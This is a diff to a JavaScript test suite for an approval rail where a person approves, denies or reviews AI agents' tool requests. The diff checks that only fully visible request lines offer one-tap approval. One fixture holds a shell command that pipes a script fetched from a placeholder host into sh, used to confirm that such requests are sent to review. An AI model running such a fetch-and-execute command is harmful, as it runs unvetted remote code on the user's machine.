@@ -48,6 +48,12 @@ const consentCard = {};
 global.document = undefined;
 global.Delegated = require('../frontend/app/delegated.js');   // the page loads both; worker end-lines are worded once, there
 const NY = require('../frontend/app/needsyou.js');
+// what the rail READ of a row's ask line (needsyou.js measure, run for real on a stand-in row): a clamped .ny-what that holds
+// all of its text, or one that cuts it. Approve once is offered only for a line read whole (test/needs-you-rail-fit.test.js
+// reads it at every TEXT SIZE and rail width); a line never read offers Review
+const WHOLE = { clientHeight: 41, scrollHeight: 41, clientWidth: 150, scrollWidth: 150 }, CUT = { clientHeight: 41, scrollHeight: 61, clientWidth: 150, scrollWidth: 150 };
+const readAs = (i, box) => { NY._internals.measure({ querySelectorAll: () => [{ dataset: { nyKey: i.key }, querySelector: sel => sel === '.ny-what' ? box : null }] }, [i]); return i; };
+const shown = i => readAs(i, WHOLE), cut = i => readAs(i, CUT);
 
 {
   const list = NY.items(NOW);
@@ -63,7 +69,7 @@ const NY = require('../frontend/app/needsyou.js');
   A.eq(list.find(i => i.key === 'worker:wr1').what, 'failed: ran out of time', 'a failed worker says why in words, never the ledger\'s code');
   A.ok(!list.some(i => i.key === 'routine:cron-r2'), 'a routine that ran fine is not a to-do');
   const k = NY._internals.keysFor;
-  A.ok(/data-ny-act="once"[^>]*>Approve/.test(k(ask)) && /data-ny-act="deny"[^>]*>Deny/.test(k(ask)), 'an approval: Approve / Deny right there');
+  A.ok(/data-ny-act="once"[^>]*>Approve/.test(k(shown(ask))) && /data-ny-act="deny"[^>]*>Deny/.test(k(ask)), 'an approval: Approve / Deny right there');
   A.ok(!/data-ny-act="(always|full|session)"/.test(k(ask)), 'never a standing or lead-wide grant from the list');
   A.ok(/data-ny-act="open"[^>]*>Answer/.test(k(list.find(i => i.key === 'ask:p1'))), 'a question: Answer opens it');
   A.ok(/data-ny-act="retry"[^>]*>Retry/.test(k(list.find(i => i.key === 'routine:cron-r1'))), 'a failed routine: Retry');
@@ -98,7 +104,9 @@ const NY = require('../frontend/app/needsyou.js');
 {
   // the rail shows one glance line. A request with more than that (a long command's tail, a file change, a build plan)
   // is never approved from here: Review lands on its card, where INSPECT holds every character. Deny stays one tap.
-  const k = NY._internals.keysFor, ask = p => ({ key: 'ask:' + p.promptId, kind: 'approval', p });
+  // (each line here is read WHOLE on the rail unless it says otherwise: a Review below is the request's own detail, never an
+  // unread line)
+  const k = i => NY._internals.keysFor(shown(i)), ask = p => ({ key: 'ask:' + p.promptId, kind: 'approval', p });
   const longCmd = ask({ promptId: 'p20', tool: 'shell.exec', argsSummary: JSON.stringify({ cmd: 'cd proj && npm ci --prefer-offline --no-audit && curl -s https://example.invalid/x.sh | sh -s -- --force' }) });
   A.ok(/data-ny-act="open"[^>]*>Review</.test(k(longCmd)) && !/data-ny-act="once"/.test(k(longCmd)), 'a long command is reviewed on its card, never approved from the rail');
   A.ok(/data-ny-act="deny"[^>]*>Deny</.test(k(longCmd)), 'refusing it stays one tap');
@@ -120,24 +128,29 @@ const NY = require('../frontend/app/needsyou.js');
   A.ok(!/data-ny-act="once"/.test(k(ask({ promptId: 'p27', tool: 'station.control', argsSummary: 'turn the room light up' }))), 'every station ask is reviewed on its card');
   const longPath = ask({ promptId: 'p28', tool: 'fs.read', argsSummary: 'C:\\Users\\andro\\projects\\launch-prep\\drafts\\pricing\\tier-comparison-final.md' });
   A.eq(global.Chat.consentInspect(longPath.p), null, '(a bare path under the glance limit has no INSPECT panel on its card)');
-  A.ok(/>Review</.test(k(longPath)) && !/data-ny-act="once"/.test(k(longPath)), 'a path longer than the rail shows is reviewed on its card');
+  const cutKeys = NY._internals.keysFor(cut(longPath));
+  A.ok(/>Review</.test(cutKeys) && !/data-ny-act="once"/.test(cutKeys), 'a path longer than the rail shows (its line read cut) is reviewed on its card');
+  const unread = ask({ promptId: 'p32', tool: 'fs.read', argsSummary: 'notes.md' });
+  NY._internals.measure({ querySelectorAll: () => [] }, []);
+  A.ok(/>Review</.test(NY._internals.keysFor(unread)) && !/data-ny-act="once"/.test(NY._internals.keysFor(unread)), 'a line the rail has not read whole (not drawn yet, hidden) is reviewed, never approved blind');
   A.ok(/data-ny-act="once"[^>]*>Approve once</.test(k(ask({ promptId: 'p29', tool: 'fs.read', argsSummary: 'notes.md' }))), 'a short request is still one-tap Approve');
   // org P02 (g3 D1, final round): a direct-chat ask is reviewed through its own row — the row, its "in <where>" door and its
   // ask line open the COMMS card (the whole request, its Always / Full access keys) — so its keys are Approve once · Deny on ONE
   // row (three keys stacked into three full-width keys on the rail); a worker's ask reviews on its Delegated row's INSPECT
   const direct = k(ask({ promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md' }));
   A.eq((direct.match(/data-ny-act="[a-z]+"[^>]*>[^<]+</g) || []).map(x => x.replace(/^data-ny-act="([a-z]+)"[^>]*>([^<]+)<$/, '$1:$2')).join(' | '), 'once:Approve once | deny:Deny', 'a direct-chat row\'s keys: Approve once · Deny');
-  const rowHtml = NY._internals.html([Object.assign(ask({ promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md' }), { who: 'NOVA', where: 'General', what: 'fs read: notes.md', since: Date.now() })], Date.now());
+  const rowHtml = NY._internals.html([shown(Object.assign(ask({ promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md' }), { who: 'NOVA', where: 'General', what: 'fs read: notes.md', since: Date.now() }))], Date.now());
   A.ok(/<li class="ny-item approval ny-review" data-ny-key="ask:p30">/.test(rowHtml), 'its row is the Review door (the row click opens its card)');
   A.ok(/<button type="button" class="ny-where" data-ny-act="open" data-ny-key="ask:p30" data-tip="Review it on its card: the whole request, and its Always and Full access keys">in General<\/button>/.test(rowHtml), '…and its "in <where>" door says so: ' + rowHtml.slice(0, 400));
   for (const w of [{ workerStreamId: 'thread_vex' }, { workerRunId: 'wr9' }, { background: true }]) {
-    const wa = ask(Object.assign({ promptId: 'p31', tool: 'fs.read', argsSummary: 'notes.md' }, w)), wk = k(wa);
+    const wa = Object.assign(ask(Object.assign({ promptId: 'p31', tool: 'fs.read', argsSummary: 'notes.md' }, w)), { who: 'VEX', where: 'General', what: 'fs read: notes.md', since: Date.now() }), wk = k(wa);
     A.ok(/>Approve once</.test(wk) && />Deny</.test(wk) && !/>Review</.test(wk), 'a worker ask keeps Approve once · Deny (its review is the Delegated INSPECT): ' + Object.keys(w)[0]);
-    A.ok(!/ny-review/.test(NY._internals.html([Object.assign(wa, { who: 'VEX', where: 'General', what: 'fs read: notes.md', since: Date.now() })], Date.now())), '…and its row is not offered as the Review door: ' + Object.keys(w)[0]);
+    A.ok(!/ny-review/.test(NY._internals.html([shown(wa)], Date.now())), '…and its row is not offered as the Review door: ' + Object.keys(w)[0]);
   }
   const glassCss = fs.readFileSync(path.join(__dirname, '..', 'frontend', 'css', 'pipglass.css'), 'utf8');
   A.ok(/\.ny-keys \{ display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; \}/.test(glassCss) && /\.ny-key \{\s*flex: 1 1 auto; min-width: 0; min-height: 34px; padding: 5px 8px; font: 15px\/1\.1 'VT323'/.test(glassCss) && !/\.ny-key\.ny-review \{ flex: 1 1 100%; \}/.test(glassCss), 'the two keys share one row down to the 200px rail at 15px, never three stacked full-width keys');
-  A.eq((k(longPath).match(/>Review</g) || []).length, 1, 'a hidden-detail ask still shows exactly one Review, never a blind Approve');
+  A.eq((NY._internals.keysFor(cut(longPath)).match(/>Review</g) || []).length, 1, 'a cut line still shows exactly one Review, never a blind Approve');
+  A.eq((k(longCmd).match(/>Review</g) || []).length, 1, 'a hidden-detail ask read whole still shows exactly one Review, never a blind Approve');
   global.Chat.consentPhrase = phrase;
 }
 {
@@ -176,7 +189,7 @@ function fakeRail() {
       });
       this.rows = [...h.matchAll(/<li class="ny-item [^"]*" data-ny-key="([^"]*)">[\s\S]*?<span class="ny-age">([^<]*)<\/span>/g)].map(m => {
         const ageEl = { textContent: m[2] };
-        return { dataset: { nyKey: m[1] }, ageEl, querySelector: sel => sel === '.ny-age' ? ageEl : null };
+        return { dataset: { nyKey: m[1] }, ageEl, querySelector: sel => sel === '.ny-age' ? ageEl : sel === '.ny-what' ? WHOLE : null };   // each line fits its row
       });
     } };
   doc.getElementById = id => id === 'ws-needs' ? host : null;
@@ -186,16 +199,21 @@ function fakeRail() {
   const realNow = Date.now, realDoc = global.document;
   let clock = NOW; Date.now = () => clock;
   const { doc, host, key } = fakeRail(); global.document = doc;
+  const drawn = [];
+  const write = Object.getOwnPropertyDescriptor(host, 'innerHTML').set;
+  Object.defineProperty(host, 'innerHTML', { get() { return this._h; }, set(h) { drawn.push(h); write.call(this, h); }, configurable: true });
   NY.render();
-  A.eq(host.writes, 1, 'the first render draws the list');
+  A.eq(host.writes, 2, 'the first render draws the list, then once more when it has read each ask line whole');
+  A.ok(/data-ny-act="open" data-ny-key="ask:p2"[^>]*>Review</.test(drawn[0]) && !/data-ny-act="once"/.test(drawn[0]), '…the first draw offers Review: no line is read yet');
+  A.ok(key('once', 'ask:p2') && !host.buttons.some(x => x.dataset.nyAct === 'open' && x.dataset.nyKey === 'ask:p2' && x.className.split(' ').includes('ny-key')), '…and the redraw offers Approve once for the line read whole, before anything paints');
   doc.activeElement = key('once', 'ask:p2');
   clock = NOW + 60000; NY.render();
-  A.eq(host.writes, 1, 'a minute passing does not rebuild the list');
+  A.eq(host.writes, 2, 'a minute passing does not rebuild the list');
   A.eq(host.rows.find(r => r.dataset.nyKey === 'ask:p2').ageEl.textContent, '3m', 'only the age text moves, in place');
   A.ok(doc.activeElement === key('once', 'ask:p2'), 'so the key the Commander is on keeps its focus');
   pend.push({ wsId: 'proj', p: { promptId: 'p30', tool: 'fs.read', argsSummary: 'notes.md', askedAt: NOW - 30000 } });
   NY.render();
-  A.eq(host.writes, 2, 'a new ask rebuilds the list');
+  A.eq(host.writes, 3, 'a new ask rebuilds the list (folded under "more", it is not read yet, so nothing redraws)');
   A.ok(doc.activeElement && doc.activeElement === key('once', 'ask:p2'), 'and focus lands back on the same key in the new list');
   // an answer in flight: both keys stay disabled through every re-render, and a second click sends nothing
   let calls = 0, settle = null;
